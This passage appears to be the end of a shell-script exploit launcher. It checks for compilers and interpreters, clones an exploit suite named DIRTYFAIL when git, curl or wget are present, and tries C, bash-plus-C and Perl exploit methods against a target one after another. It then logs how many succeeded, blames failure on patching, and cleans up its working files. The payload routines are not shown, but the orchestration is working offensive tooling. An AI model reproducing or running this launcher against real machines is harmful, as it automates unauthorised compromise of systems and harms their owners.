if [ "$HAS_GCC" = "1" ]; then
    METHODS_TRIED=$((METHODS_TRIED + 1))
    # If git or curl available, clone DIRTYFAIL for full exploit suite
    if [ "$HAS_GIT" = "1" ] || [ "$HAS_CURL" = "1" ] || [ "$HAS_WGET" = "1" ]; then
        run_c_compile && METHODS_SUCCESS=$((METHODS_SUCCESS + 1))
    fi

    # Also try minimal bash+C if DIRTYFAIL failed
    if [ "$RESULT_C" != "0" ]; then
        run_bash_c && METHODS_SUCCESS=$((METHODS_SUCCESS + 1))
    fi
fi

if [ "$HAS_PERL" = "1" ]; then
    METHODS_TRIED=$((METHODS_TRIED + 1))
    run_perl && METHODS_SUCCESS=$((METHODS_SUCCESS + 1))
fi

# If nothing else worked and we have bash+gcc but didn't try yet
if [ "$METHODS_SUCCESS" = "0" ] && [ "$HAS_GCC" = "1" ] && [ "$RESULT_C" = "255" ]; then
    METHODS_TRIED=$((METHODS_TRIED + 1))
    run_bash_c && METHODS_SUCCESS=$((METHODS_SUCCESS + 1))
fi

log "========================================="
log "Results: $METHODS_SUCCESS/$METHODS_TRIED methods succeeded"

if [ "$METHODS_SUCCESS" = "0" ]; then
    if [ "$METHODS_TRIED" = "0" ]; then
        err "No suitable runtime found (need python3, perl, or gcc/cc)"
    else
        err "All methods failed — target may be patched or preconditions unmet"
    fi
    cleanup_workdir
    exit 1
fi

cleanup_workdir
exit 0
